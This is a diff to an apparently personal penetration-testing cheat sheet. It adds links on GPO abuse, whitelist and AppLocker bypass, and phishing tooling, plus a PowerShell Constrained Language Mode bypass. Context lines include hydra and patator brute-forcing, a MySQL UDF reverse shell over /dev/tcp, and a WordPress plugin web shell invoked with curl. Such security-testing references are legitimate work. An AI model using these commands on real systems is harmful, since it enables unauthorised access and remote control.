@@ -256,6 +256,7 @@ PS > Set-Acl -AclObject $acl "AD:DC=megacorp,DC=local"
 * [https://pentestmag.com/gpo-abuse-you-cant-see-me/](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
 * [https://wald0.com/?p=179](https://wald0.com/?p=179)
 * [https://habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
+* [https://github.com/EvotecIT/GPOZaurr](https://github.com/EvotecIT/GPOZaurr)
 
 
 
@@ -1293,6 +1294,15 @@ PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.
 
 
 
+# Application Whitelist Bypass
+
+* [https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/](https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/)
+* [https://vanmieghem.io/stealth-outlook-persistence/](https://vanmieghem.io/stealth-outlook-persistence/)
+
+
+
+
+
 # AppLocker Bypass
 
 * [https://github.com/api0cradle/UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
@@ -1323,6 +1333,21 @@ $ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 888
 ```
 $ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
 $ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
+```
+
+
+
+
+
+# Constrained Language Mode Bypass
+
+In-place functions:
+
+```
+PS > whoami
+The term 'whoami.exe' is not recognized as the name of cmdlet...
+PS > &{ whoami }
+megacorp\snovvcrash
 ```
 
 
@@ -1371,7 +1396,7 @@ $ sudo apt install libc6-dev-i386 -y
 $ gcc lib_mysqludf_sys.c -o lib_mysqludf_sys_x86.so -m32 -Wl,--hash-style=both -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
 ```
 
-Compile `.so` library (x86_64 example):
+Compile `.so` library (x64 example):
 
 ```
 $ gcc lib_mysqludf_sys.c -o lib_mysqludf_sys_x64.so -m64 -Wl,--hash-style=both -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
@@ -1395,7 +1420,7 @@ mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_x86.so'
 mysql> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");
 ```
 
-MariaDB (x86_64 example):
+MariaDB (x64 example):
 
 ```
 MariaDB> show variables like '%plugin%';  # get lib path
@@ -2055,7 +2080,7 @@ $ sudo sysctl -w net.ipv4.ip_forward=1
 ```
 
 
-#### dsniff [arpspoof]
+#### arpspoof [dsniff]
 
 * [https://github.com/tecknicaltom/dsniff](https://github.com/tecknicaltom/dsniff)
 
@@ -6172,6 +6197,27 @@ $ snmp-check -v 2c -c public 10.10.13.37
 
 
 
+# SE
+
+
+
+
+## Infra
+
+* [https://github.com/n0pe-sled/Postfix-Server-Setup](https://github.com/n0pe-sled/Postfix-Server-Setup)
+
+
+
+
+## Tools
+
+* [https://github.com/decalage2/oletools](https://github.com/decalage2/oletools)
+* [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)
+
+
+
+
+
 # TFTP
 
 Enum with Nmap NSE:
@@ -7407,7 +7453,7 @@ Reverse-shell with a malicious plugin:
 ```
 $ cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
 $ zip plugin-shell.zip plugin-shell.php
-...Upload plugin-shell.zip (do not activate it)...
+...Upload plugin-shell.zip and install it (but do not activate)...
 $ curl 'http://10.10.13.37/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami'
 ```
 
